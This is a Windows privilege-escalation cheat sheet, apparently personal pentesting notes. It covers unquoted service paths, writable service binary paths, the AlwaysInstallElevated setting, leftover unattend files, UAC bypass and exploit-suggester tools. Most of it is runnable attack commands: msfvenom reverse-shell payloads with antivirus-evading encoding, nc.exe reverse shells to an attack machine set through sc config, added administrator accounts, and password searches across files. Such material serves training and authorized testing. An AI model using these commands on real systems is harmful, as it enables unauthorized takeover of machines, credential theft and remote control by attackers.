# Privilege escalation: Windows

If you started hacking on Linux, Windows can be frustrating and weird. But that's what most networks are running, from desktops to domain controllers. So you just have to get used to it.

## Gathering system information

Be warned, these commands will generate an overwhelming amount of information.

### System information

Find out some basic information about the host:

```text
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
echo %username%
net users
net user user1
```

Output from the `systeminfo` command is useful for passing into script-based exploit suggesters \(see below\).

### Active network connections

```text
netstat -ano
```

### Firewall settings

```text
netsh firewall show state
netsh firewall show config
```

### Scheduled tasks

```text
schtasks /query /fo LIST /v
```

### Running processes

Running processes linked to services:

```text
tasklist /SVC
```

Running services:

```text
net start
```

### Installed drivers

```text
DRIVERQUERY
```

### Installed patches

```text
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Program permissions

Check if a program has insecure permissions \(e.g. anyone can read/write\):

```text
icacls program.exe
program.exe NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
Everyone:(I)(F) # uh oh
```

### Interesting files

Search for files that contain ‘password’ in the filename:

```text
dir /s *password*
```

Search for the keyword ‘password’ in files with the .txt extension:

```text
findstr /si password *.txt
```

## Unquoted service path

This is a common vulnerability for installed programs that don't put quotes around the file path to the executable:

```text
C:\Program Files\Some Software\Software.exe     #unquoted

"C:\Program Files\Some Software\Software.exe"
```

When Windows tries to locate the program, it guesses and tries to execute any word before a space. For example, in the unquoted service path above, Windows will try:

```text
C:\Program.exe

C:\Program Files\Some.exe

C:\Program Files\Some Software\Software.exe
```

An attacker could exploit this behaviour by putting a malicious program earlier in the file path so that Windows executes it before the legitimate one. In order for this to be successful, these conditions must be true:

1. There is a service with an unquoted binary path containing one or more spaces in the path
2. The current user has Write permissions for the folders containing spaces
3. There is a way to reboot the system or service in order to execute a payload

List all services with an unquoted service path:

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

If this returns a an unquoted service path, use icacls to check permissions on each directory in the path:

```text
icacls "C:\Program Files\Some Software\"
```

If you can write to this directory, you can replace the executable with malicious one called `Some.exe`. This principle also applies to higher folders in the directory structure, if you have write permissions \('C:\' and 'C:\Program Files\'.

You can create a malicious .exe that sends a reverse shell to your machine with Metasploit \(assuming there is no antivirus, haha\):

```text
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[attack machine] LPORT=443 -f exe -o servicename.exe
```

Then restart the service:

```text
sc stop [service name]

sc start [service name]
```

If you don't have permission to restart the service, you'll have to wait for a system reboot or a more privileged user to restart it.

If you're super lazy you can just use this Metasploit module: `exploit/windows/local/trusted_service_path`

## Modifying binary service path

Similar to the unquoted service path vulnerability, you can attempt to modify the file path of a service and point it to a malicious executable in a writable directory.

Windows has a tool called named `accesschk.exe` which checks permissions. To display services which can be modified by an authenticated user:

```text
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

A service with write permissions for an authenticated user looks like this:

```text
RW [service name] SERVICE_ALL_ACCESS
```

Show the service properties:

```text
sc qc [service name]
```

This is where you can find out the `BINARY_PATH_NAME` value. Change the binary path on a particular service:

```text
sc config [service name] binpath= "C:\tmp\nc.exe -nv [attack machine] 4444 -e C:\WINDOWS\System32\cmd.exe"
sc qc [service name]
sc stop [service name]
sc start [service name]
```

If the service is disabled when you type in `sc qc [service name]` you can enable it using `sc config SSDPSRV start= auto` - note that there is a space between the `=` and the option.

Common errors include ftp-ing `nc.exe` without using the `binary` command first and using the wrong `"` in the path. If you're working with Windows XP, you'll need to [download this version](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe). Also, the Administrator shell fired using this method will not last, so you should send yourself another shell immediately with a different port: 

```text
C:\tmp\nc.exe -nv [attack machine] 80 -e C:\WINDOWS\System32\cmd.exe
```

You can also add a new user and grant administrator rights using the binary path:

```text
sc config [service name] binpath= "net user admin password /add"
sc stop [service name]
sc start [service name]
sc config [service name] binpath= "net localgroup Administrators admin /add"
sc stop [service name]
sc start [service name]
```

Again, if you're super lazy here's a Metasploit Module: `exploit/windows/local/service_permissions`

## AlwaysInstallElevated setting

Windows registry has a setting that allows non-privileged users to install Microsoft Windows Installer Package Files \(MSI\) with elevated system permissions. There are 2 registry entries which have to be set to `1` to enable this setting.

Check the values of the registry keys:

```text
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If AlwaysInstallElevated is enabled in the registry entries you can create an installer payload with `msfvenom` \(again assuming there is no antivirus\):

```text
msfvenom -p windows/adduser USER=admin PASS=password -f msi –o filename.msi
```

Generate a payload with a reverse shell:

```text
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[attacking host] LPORT=443 -f msi -o filename.msi
```

Then use the following command to execute the msi installer file:

```text
msiexec /quiet /qn /i C:\Users\filename.msi
```

A summary of these flags:

* `/quiet` will bypass User Account Control \(UAC\)
* `/qn` specifies not to use a GUI
* `/i` is to perform a regular installation of the package

For the lazy, here's a Metasploit module: `exploit/windows/local/always_install_elevated`

## Unattended Installs

Unattended Installs allows administrators to deploy Windows in a hands-off way. However, if they don't clean up after this process, an XML file called Unattend is left on the local system, full of configuration settings and possibly local account configurations \(e.g. Administrators\).

Unattend files are often found in these folders:

```text
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
```

Common filenames:

```text
unattend.xml
sysprep.xml
sysprep.inf
```

Passwords in these files may be base64 encoded, [decode them here](https://gchq.github.io/CyberChef/) or in [Burp Decoder](http://www.hackingarticles.in/burpsuite-encoder-decoder-tutorial/).

And if you're lazy, a Metasploit module: `post/windows/gather/enum_unattend`

## BypassUAC Metasploit module

If you have a meterpreter shell and `getsystem` isn't working, you can try this method, which uses the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.

First background your meterpreter session:

```text
background
```

Then set the UAC bypass module:

```text
use exploit/windows/local/bypassuac
```

Set the session ID and the listening host IP:

```text
set session [Session ID]
set lhost [attacking host]
run
```

This will spawn a second shell with UAC disabled, which might help you get `NT/AUTHORITY\SYSTEM`

```text
getsystem
```

## Scripts

### Windows Exploit Suggester

Windows Exploit Suggester is a tool to identify missing patches and associated exploits on a Windows host. It uses the output of `systeminfo` and compares it against the Microsoft vulnerability database, which is automatically downloaded and stores as a spreadsheet. Based on the output, the tool lists public exploits \(E\) and Metasploit modules \(M\).

If you don't have it, you can clone the git repository:

```text
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

You may need to install the python-xlrd dependency for parsing Excel spreadsheets:

```text
apt-get update
apt-get install python-xlrd
```

Change the working directory to the Windows Exploit Suggester directory and run the updater:

```text
python windows-exploit-suggester.py --update
```

At that point, you should run `systeminfo` on the victim machine and save the contents as a text file:

```text
systeminfo
```

Then run Windows Exploit Suggester to find vulnerabilities:

```text
python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt
```

As with any script-based exploit suggester, there are false positives and junk data. To reduce the output to local vulnerabilities, add the `--local` option

```text
python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --local
```

Similarly, to filter output to remote vulnerabilities use `--remote`:

```text
python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --remote
```

#### WMI hotfixes

If can't retrieve installed hotfixes from `systeminfo` you can find installed patches using the WMI command-line \(WMIC\) utility:

```text
wmic qfe list full
```

Store the output in a file named and run Windows Exploit Suggester with the following options:

```text
python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --hotfixes hotfixes.txt
```

### Metasploit local exploit suggester

If you have a Meterpreter shell running, you can discover local exploits:

```text
meterpreter > run post/multi/recon/local_exploit_suggester
```

The output is okay, but there seem to be a lot of false positives and incorrect versions.

### Powersploit Privesc

This one might also be useful but I haven't tried it yet:

[PowerSploit Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

If you have a Windows exploit written in python, you can create an executable by installing PyWin32 and then extracting and running the `pyinstaller` module:

```text
python pyinstaller.py --onefile ms11-080.py
```
